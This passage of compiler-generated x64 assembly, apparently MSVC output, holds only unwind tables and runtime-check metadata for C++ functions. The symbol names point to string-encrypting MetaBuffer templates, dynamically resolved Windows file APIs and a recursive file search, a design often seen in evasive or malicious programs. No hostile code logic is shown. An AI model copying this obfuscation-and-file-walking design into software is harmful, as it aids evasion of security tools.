	DQ	FLAT:?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcName$0
	ORG $+96
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcFrameData DD 02H ; MakePath
	DD	00H
	DQ	FLAT:?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z DD 045051d01H
	DD	0118431dH
	DD	070110031H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02bH
	DB	055H
	DB	07fH
	DB	0a9H
	DB	0d3H
	DB	0ddH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z DD 025053101H
	DD	01132318H
	DD	0700c004fH
	DD	0500bH
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcName$0 DB 053H ; MakeSearchMask
	DB	065H
	DB	061H
	DB	072H
	DB	063H
	DB	068H
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	00H
	ORG $+5
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcName$1 DB 05fH ; MakeSearchMask
	DB	05fH
	DB	024H
	DB	041H
	DB	072H
	DB	072H
	DB	061H
	DB	079H
	DB	050H
	DB	061H
	DB	064H
	DB	00H
	ORG $+4
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcVarDesc DD 088H ; MakeSearchMask
	DD	08H
	DQ	FLAT:?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcName$1
	DD	048H
	DD	020H
	DQ	FLAT:?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcName$0
	ORG $+96
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcFrameData DD 02H ; MakeSearchMask
	DD	00H
	DQ	FLAT:?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gdirectory_info_@@QEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1directory_info_@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0directory_info_@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pStrStrIW@@YAPEB_WPEB_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpW@@YAHPEB_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindClose@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCloseHandle@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetLastError@@YAKXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z DD 045052101H
	DD	011c4321H
	DD	070150025H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	0636H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z DD 025054c19H
	DD	011d2322H
	DD	0701601e5H
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0f10H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$0 DB 044H ; filesystem::SearchFiles
	DB	069H
	DB	072H
	DB	065H
	DB	063H
	DB	074H
	DB	06fH
	DB	072H
	DB	079H
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+2
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$1 DB 046H ; filesystem::SearchFiles
	DB	069H
	DB	06eH
	DB	064H
	DB	044H
	DB	061H
	DB	074H
	DB	061H
	DB	00H
	ORG $+7
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$2 DB 043H ; filesystem::SearchFiles
	DB	075H
	DB	072H
	DB	072H
	DB	065H
	DB	06eH
	DB	074H
	DB	044H
	DB	069H
	DB	072H
	DB	065H
	DB	063H
	DB	074H
	DB	06fH
	DB	072H
	DB	079H
	DB	00H
	ORG $+7
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$3 DB 053H ; filesystem::SearchFiles
	DB	065H
	DB	061H
	DB	072H
	DB	063H
	DB	068H
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	00H
	ORG $+5
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$4 DB 044H ; filesystem::SearchFiles
	DB	069H
	DB	072H
	DB	065H
	DB	063H
	DB	074H
	DB	06fH
	DB	072H
	DB	079H
	DB	00H
	ORG $+6
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$5 DB 046H ; filesystem::SearchFiles
	DB	069H
	DB	06cH
	DB	065H
	DB	06eH
	DB	061H
	DB	06dH
	DB	065H
	DB	00H
	ORG $+7
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$6 DB 046H ; filesystem::SearchFiles
	DB	069H
	DB	06cH
	DB	065H
	DB	049H
	DB	06eH
	DB	066H
	DB	06fH
	DB	00H
	ORG $+15
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcVarDesc DD 0450H ; filesystem::SearchFiles
	DD	0290H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$6
	DD	0408H
	DD	020H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$5
	DD	03a8H
	DD	020H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$4
	DD	0348H
	DD	020H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$3
	DD	0308H
	DD	020H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$2
	DD	080H
	DD	0250H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$1
	DD	028H
	DD	010H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcName$0
	ORG $+336
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcFrameData DD 07H ; filesystem::SearchFiles
	DD	00H
	DQ	FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
	DB	0f6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 025054719H
	DD	0118231dH
	DD	070110025H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0118H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	065H
	DB	064H
	DB	00H
	ORG $+8
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	08H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0
	ORG $+48
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	00H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DB	041H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	05fH
	DB	06dH
	DB	061H
	DB	078H
	DB	00H
	ORG $+5
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	08H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0
	ORG $+48
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	00H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	070110029H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 035051d01H
	DD	0118331dH
	DD	07011002fH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0025H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z DD 025051801H
	DD	01132318H
	DD	0700c0035H
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	044H
	DW	01eeH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z DD 025054b19H
	DD	011c2321H
	DD	070150045H
	DD	05014H
	DD	imagerel __GSHandlerCheck
	DD	0218H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	DB	046H
	DB	061H
	DB	06eH
	DB	063H
	DB	079H
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+14
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcVarDesc DD 0e8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	DD	08H
	DQ	FLAT:??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$2
	DD	0c4H
	DD	01H
	DQ	FLAT:??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcName$0
	ORG $+144
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	DD	00H
	DQ	FLAT:??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0025H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 025051801H
	DD	01132318H
